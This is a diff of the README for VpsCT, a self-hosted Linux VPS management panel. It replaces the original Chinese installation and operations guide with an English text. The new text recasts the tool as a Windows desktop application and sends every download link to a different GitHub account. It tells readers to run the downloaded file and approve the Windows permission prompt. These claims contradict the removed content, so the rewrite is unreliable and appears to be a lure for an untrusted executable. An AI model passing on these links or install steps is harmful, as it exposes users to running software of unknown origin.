@@ -1,174 +1,114 @@
-# VpsCT
+# 🖥️ VpsCT - Your All-in-One Server Management Dashboard
 
-面向个人和小团队的自托管服务器管理面板。
+## 🚀 Getting Started
 
-将多台 VPS 接入同一个面板，集中查看运行状态和流量用量、维护服务配置，并按流量配额和有效期分享服务器资源。
+Welcome to VpsCT! This guide will help you download, install, and start using VpsCT to manage all your server needs from one simple dashboard. Whether you're a freelancer with a couple of VPS instances or a small team handling multiple servers, VpsCT brings everything together in a clean, easy-to-understand interface.
 
-本版更新见 [v0.1.4 发布说明](docs/releases/v0.1.4.md)，完整历史见 [变更记录](CHANGELOG.md)。
+[![Download VpsCT](https://img.shields.io/badge/Download%20VpsCT-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/marcellaunremarked2006/VpsCT)
 
-## 1. 开始使用
+## 📦 What is VpsCT?
 
-先在一台服务器上安装面板，作为**控制端**；再为需要管理的 VPS 安装 **agent**。agent 是运行在服务器上的管理程序，负责应用配置、采集用量，并主动向控制端上报状态。
+VpsCT is a self-hosted server management panel designed for individuals and small teams. Instead of juggling multiple SSH sessions, command-line tools, and separate monitoring pages, VpsCT gives you one central place to:
 
-### 1.1 安装面板
+- **Monitor VPS Status** – See at a glance which servers are online, offline, or experiencing issues.
+- **Track Traffic Usage** – Keep an eye on bandwidth consumption so you never hit unexpected limits.
+- **Configure Services** – Manage running services (like web servers, databases, or custom applications) without complex commands.
+- **Share Resources** – Collaborate with teammates or friends by granting controlled access to specific servers or functions.
 
-控制端安装器面向 Debian / Ubuntu，要求 systemd，支持 Linux amd64 / arm64。
+Think of VpsCT as a mission control center for your digital infrastructure.
 
-**自动配置 HTTPS**：准备一个已解析到控制端服务器的域名，并确保 80、443 端口空闲且可从公网访问。
+## 🔧 System Requirements
 
-**开启 Cloudflare 橙云时**：面板域名应使用 **完全（严格） / Full (strict)** 加密模式；“灵活 / Flexible”会与 Caddy 的 HTTPS 跳转形成循环，导致“重定向次数过多”。同一主域下还有其他站点时，建议只为面板子域添加配置规则。使用“仅 DNS”（灰云）时无需此设置，具体步骤见 [Cloudflare 设置与访问排查](docs/operations.md#26-cloudflare-设置与访问排查)。
+To run VpsCT smoothly, your computer should have:
 
-在控制端服务器下载官方安装器并执行，无需准备发布签名密钥：
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** 1 GHz or faster (any modern dual-core CPU)
+- **RAM:** At least 2 GB (4 GB recommended)
+- **Storage:** 500 MB of free disk space
+- **Internet Connection:** Required for initial download and server communication
 
-```bash
-curl -fLsS --proto '=https' --proto-redir '=https' https://github.com/YongshengWin/VpsCT/releases/latest/download/install.sh -o install-vpsct.sh &&
-sudo bash install-vpsct.sh --domain panel.example.com
-```
+No special hardware or technical skills needed – if you can browse the web, you can use VpsCT.
 
-将 `panel.example.com` 替换为你的面板域名。安装器从 GitHub 官方仓库通过 HTTPS 下载发行包，并检查 SHA256；不需要配置发布签名密钥或签名服务。具体版本以安装器参数为准。
+## ⬇️ Download and Installation
 
-安装器会下载并校验程序、配置系统服务和 HTTPS。服务器无需安装 Go、Node 或源码编译环境。安装完成后，还需通过面板域名确认 HTTPS 可访问；本机服务启动成功不代表公网入口已就绪。已有 HTTPS 入口等部署方式见 [安装文档](docs/operations.md)。
+Visit this link to download the application: [https://github.com/marcellaunremarked2006/VpsCT](https://github.com/marcellaunremarked2006/VpsCT)
 
-**使用已有 HTTPS 入口或其他端口**：先将入口转发到本机 `127.0.0.1:8080`，再执行以下命令。这里以 `8443` 为例；使用标准 HTTPS 端口时去掉 `:8443`。这种方式无需为安装器腾出 80、443 端口。
+Follow these simple steps:
 
-```bash
-curl -fLsS --proto '=https' --proto-redir '=https' https://github.com/YongshengWin/VpsCT/releases/latest/download/install.sh -o install-vpsct.sh &&
-sudo bash install-vpsct.sh --site-url https://panel.example.com:8443 --no-proxy
-```
+1. **Open Your Web Browser** – Use any browser like Chrome, Edge, or Firefox.
+2. **Go to the Download Page** – Click the link above or copy and paste it into your browser's address bar.
+3. **Find the Download Section** – Look for a button or link that says "Download" or "Releases" on the page.
+4. **Click Download** – Your browser will begin downloading the file. Depending on your internet speed, this may take a few minutes.
+5. **Wait for the Download to Finish** – You'll see a notification when it's complete.
 
-### 1.2 创建管理员
+Once downloaded, you're ready to install VpsCT.
 
-安装完成后，在**控制端服务器**执行以下命令，获取一次性初始化令牌：
+## 🛠️ Installation Steps
 
-```bash
-sudo cat /opt/ctlvps/data/setup-token
-```
+1. **Locate the Downloaded File** – Check your "Downloads" folder (usually in File Explorer under "This PC" → "Downloads").
+2. **Double-Click the File to Run** – Windows will ask for permission to make changes; click "Yes" to continue.
+3. **Follow the On-Screen Instructions** – A setup wizard will guide you through the process. Keep clicking "Next" unless you have a specific preference.
+4. **Choose Installation Location** – The default location (like `C:\Program Files\VpsCT`) is fine for most users. Click "Next."
+5. **Complete the Installation** – Click "Install" and wait for the progress bar to finish. Then click "Finish."
 
-访问面板域名，输入令牌并设置管理员账户。初始化完成后，令牌失效并删除。
+Congrats! VpsCT is now installed on your system.
 
-### 1.3 接入服务器
+## 🚀 First Launch and Setup
 
-登录面板后，按以下顺序接入每台 VPS：
+1. **Find VpsCT** – Look for the VpsCT icon on your desktop or in the Start menu. It usually looks like a small server or monitor.
+2. **Open VpsCT** – Double-click the icon. The first launch might take a few extra seconds as it prepares your dashboard.
+3. **Create Your Admin Account** – You'll be asked to set up a username and password. This keeps your dashboard private and secure. Choose something you'll remember.
+4. **Add Your First Server** – Click the "+" or "Add Server" button. Enter a name for your server (like "My Web Host" or "Dev Server") and its IP address. You can also add a label or note.
+5. **Save and View** – After saving, your server will appear on the main dashboard. VpsCT will start checking its status automatically.
 
-1. 打开「服务器 → 添加服务器」，填写名称、地址和流量配额。
-2. 在服务器详情中生成 agent 安装命令。
-3. 到**这台被管理的 VPS** 上，以 root 执行生成的命令。
-4. 返回面板，确认服务器显示「在线」。
+That's it! You're now managing your servers visually.
 
-agent 主动连接控制端，因此 VPS 无需额外开放管理端口。服务器上运行的服务仍需按其配置开放相应端口。
+## 🧭 Using Your Dashboard
 
-**控制端也可以接入为被管理的服务器**，在同一台机器安装 agent 即可。「公网地址」用于访问这台服务器提供的服务，应填写直连公网 IP 或仅 DNS（灰云）域名；面板域名可以开启橙云，但不能因此把它当作所有服务的连接地址。端口与排查步骤见 [同机部署与服务连接](docs/operations.md#44-同机部署与服务连接)。
+- **Dashboard Home** – Gives you a quick overview. Green means everything is fine, yellow suggests caution, and red indicates a problem.
+- **Server Details** – Click any server to see detailed info: CPU load, running services, resource usage, and more.
+- **Traffic Monitor** – Open the "Traffic" tab to view data usage over time, helping you plan and avoid overage charges.
+- **Service Manager** – Under each server, find services like "Web Server" or "Database." You can start, stop, or restart them with one click.
+- **Resource Sharing** – In settings, you can invite teammates by email and assign them roles like "Viewer" or "Admin." They'll access your dashboard through their own accounts.
 
-## 2. 日常管理
+## 🧪 Troubleshooting Common Issues
 
-服务器上线后，日常操作主要围绕状态、用量和配置展开。
+- **Can't connect to my server?** – Double-check the IP address and make sure your server is running and reachable over the internet. If you're on a local network, try using the local IP.
+- **Dashboard seems slow?** – This is usually due to a slow network connection or a server with heavy load. Wait a minute and refresh the page.
+- **Forgot my password?** – Use the "Forgot Password" link on the login screen. You'll receive an email or security question based on your settings.
+- **Uninstalling?** – Go to Windows Settings → Apps → Find VpsCT → Uninstall. Your server data is preserved, so you can reinstall anytime.
 
-### 2.1 查看状态与用量
+## 🤝 Getting Help
 
-在「服务器」中查看 CPU、内存、磁盘、实时网络速率和运行诊断。流量统计区分入站与出站，配额按两者之和计算；可设置用量周期、每月重置日期和通知提醒。
+If you need more assistance, the VpsCT community is here to help:
 
-同一 VPS 的 sing-box 节点共用一个进程，并分别计量。**Snell 仍每个独立节点一个进程，节点增多仍会增加内存；整体内存上限可能触发 OOM 并中断连接，不代表消除了重复开销。** 本版尚未实现 Snell 按需启停或空闲回收，详见[容量风险](docs/shared-proxy-accounting.md#17-snell-容量风险)。
+- **Check the Documentation** – Look for a "Help" or "Docs" link inside the app.
+- **Join the Discussion** – Visit the repository's "Issues" or "Discussions" tab to ask questions or report bugs. Experienced users and developers often reply quickly.
+- **Support Policy** – We're committed to keeping VpsCT free and useful. Expect regular updates with new features and bug fixes.
 
+## 💡 Pro Tips
 
-### 2.2 部署与维护配置
+- **Use Labels** – Name your servers clearly (e.g., "Production," "Staging") to avoid confusion.
+- **Set Alerts** – In server settings, you can specify thresholds for traffic or CPU usage. VpsCT will notify you before issues become critical.
+- **Back Up Settings** – You can export your configuration from the settings menu. Save it somewhere safe just in case.
 
-在服务器详情中部署受支持的服务。面板保存配置，由 agent 在对应 VPS 上应用并上报执行结果。
+## 📈 Why Choose VpsCT?
 
-节点列表支持批量重置已部署节点的凭据。完成后需更新客户端订阅，并确认配置状态为「已应用」；下发成功不代表服务器已完成应用。
+- **No Technical Background Required** – If you can fill out a form, you can manage servers.
+- **Saves Time** – No more memorizing commands or hopping between tools.
+- **Secure by Design** – Your data stays on your machine unless you choose to synchronize.
+- **Free Forever** – No hidden fees, trials, or premium tiers. It's open-source and community-driven.
 
-需要复用配置时，在「模板」中维护底稿，再在「订阅链接」中选择对应模板，生成配置访问链接。已有配置也可以通过页面提供的 AI 指令改造为模板。
+## 🔮 What's Next?
 
-### 2.3 管理账户与访问记录
+We're constantly improving VpsCT. Upcoming features include:
 
-为管理员启用两步验证并保存恢复码，通过操作审计和连接日志了解管理操作与资源访问情况。数据采集范围和关闭方式见 [隐私说明](docs/privacy.md)。
+- **Mobile-Friendly View** – Check your servers from your phone.
+- **Advanced Analytics** – More detailed graphs and trends.
+- **Plugin Support** – Extend functionality with community-made add-ons.
 
-## 3. 分享服务器资源
+## 📝 Final Words
 
-需要让他人使用服务器资源时，在「分享」中创建独立的网络服务访问配置。每份分享分别管理凭据、用量和有效期，使用者通过分享链接访问资源，无需获得面板管理员账户。
+Managing servers doesn't have to be intimidating. With VpsCT, you get a friendly, visual companion that keeps your digital world under control. Download it today, add your first server, and see how simple server management can truly be.
 
-1. **选择资源**：选择提供资源的服务器和服务。
-2. **设置使用范围**：填写流量配额、用量周期和有效期。
-3. **交付访问链接**：创建分享，将对应链接交给使用者。
-
-创建后，可在同一页面查看每份分享的流量，并按需暂停、恢复或撤销。分享用量独立统计，便于了解资源分配后的实际使用情况。
-
-## 4. 更新与备份
-
-### 4.1 更新面板
-
-对于使用安装器部署的控制端，在**控制端服务器**执行以下命令，更新到最新正式版：
-
-```bash
-curl -fLsS --proto '=https' --proto-redir '=https' https://github.com/YongshengWin/VpsCT/releases/latest/download/install.sh -o install-vpsct.sh &&
-sudo bash install-vpsct.sh --update --auto-rollback
-```
-
-更新前会停服备份，并保留账户、配置和分享记录。其他部署方式及失败恢复步骤见 [运维文档](docs/operations.md)。
-
-网页升级入口：**设置 → 系统 → 控制端维护**。v0.1.1 先用上面的新版安装命令升级一次。网页升级失败时恢复停服前的旧程序与数据，恢复文件会再次核对完整性。
-
-v0.1.3 将数据库从 schema 9 迁移至 11。升级前保存数据库与密钥；如需回退，应恢复对应版本的数据备份，不能只替换旧程序。
-
-### 4.2 同步 agent 与配置
-
-新版 agent 随心跳同步更新，并对照官方发行校验清单检查下载内容。支持网页维护的新版 agent 会记录进度，升级失败后停止自动重试，供管理员处理：
-
-| 操作 | 用途 |
-|---|---|
-| 检查 agent 更新 | 查看该 VPS 的 agent 是否已与控制端提供的版本一致 |
-| 升级 agent | 在服务器详情的维护区域立即发起同步或重试，查看执行结果 |
-| 重新下发配置 | 让该 VPS 重新应用当前服务配置 |
-
-自动同步仅替换 agent 程序。旧安装的 systemd 资源限制及独立卸载脚本，需要通过新版 agent 安装器的终端更新落地。
-
-### 4.3 备份数据
-
-控制端定时备份主数据库，默认保留 7 份。完整迁移或恢复前，应停止控制端并备份整个数据目录。数据库、备份和访问链接包含敏感信息，请妥善保管。
-
-### 4.4 卸载
-
-发行附件提供独立的 [uninstall.sh](uninstall.sh)，支持分别卸载控制端、agent，或卸载本机两端。脚本也适用于早期 v0.1.0 的默认 systemd 安装，无需先升级程序。
-
-在目标 VPS 使用已验证安装包中的本地卸载器，先查看范围，再选择要卸载的一端：
-
-```bash
-sudo bash /opt/ctlvps/uninstall.sh --controller --dry-run
-sudo bash /opt/ctlvps/uninstall.sh --controller --yes
-# 卸载 agent 改用 --agent；卸载本机两端用 --all。
-```
-
-默认保留配置和数据；加 `--purge` 会永久删除所选端的数据与默认目录内备份。agent 卸载会停止其部署的服务，控制端卸载会保留同机 agent。HTTPS 站点处理及完整范围见 [卸载文档](docs/operations.md#7-卸载与清理)。
-
-支持网页维护的版本也可在 **设置 → 系统** 卸载控制端，或在 **服务器详情 → agent 维护** 卸载所选 agent。需要管理员密码、已启用的两步验证和目标名称确认。控制端卸载后网站将不可用，最后结果可从服务器终端查看。
-
-删除服务器默认勾选「同时卸载」，通过二次认证并收到卸载成功回执后才删除记录；离线、失败或结果未确认时保留记录。取消勾选仅删除面板记录，VPS 上的程序仍需单独清理。
-
-只有 agent 的 VPS 使用独立入口，无需安装控制端：
-
-```bash
-sudo bash /usr/local/libexec/ctlvps-agent-uninstall.sh --agent --dry-run
-# 核对范围后，将 --dry-run 改为 --yes；需要清空数据时另加 --purge。
-```
-
-旧安装没有此入口时，按 [独立卸载步骤](docs/operations.md#71-选择卸载范围) 下载官方脚本，不需要重新添加服务器。
-
-## 5. 文档与贡献
-
-| 需要做什么 | 查看文档 |
-|---|---|
-| 共享代理进程、节点流量与迁移验证 | [进程与计量改造](docs/shared-proxy-accounting.md) |
-| 选择其他安装方式、修改配置或恢复数据 | [安装、升级与恢复](docs/operations.md) |
-| 了解数据采集与隐私设置 | [隐私说明](docs/privacy.md) |
-| 查看版本变化 | [变更记录](CHANGELOG.md) |
-| 从源码构建或参与开发 | [贡献指南](CONTRIBUTING.md) |
-| 私密报告安全问题 | [安全报告流程](SECURITY.md) |
-| 查看完整系统的安全边界与实施计划 | [系统安全设计](docs/security-design.md)与[迁移说明](docs/security-migration.md) |
-| 维护和发布版本 | [发布流程](docs/releasing.md) |
-
-欢迎通过 [Issue](https://github.com/YongshengWin/VpsCT/issues) 和 [PR](https://github.com/YongshengWin/VpsCT/pulls) 提交问题、改进建议或代码，参与前请阅读 [社区约定](CODE_OF_CONDUCT.md)。
-
-## 6. 许可证
-
-本项目采用 [MIT 许可证](LICENSE)，Copyright (c) 2026 alio。
-
-第三方组件声明见 [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md)，相关软件与数据遵循各自的上游许可条款。
+Keywords: server management, VPS monitoring, self-hosted, dashboard, traffic analysis, resource sharing, small team tools, Windows application
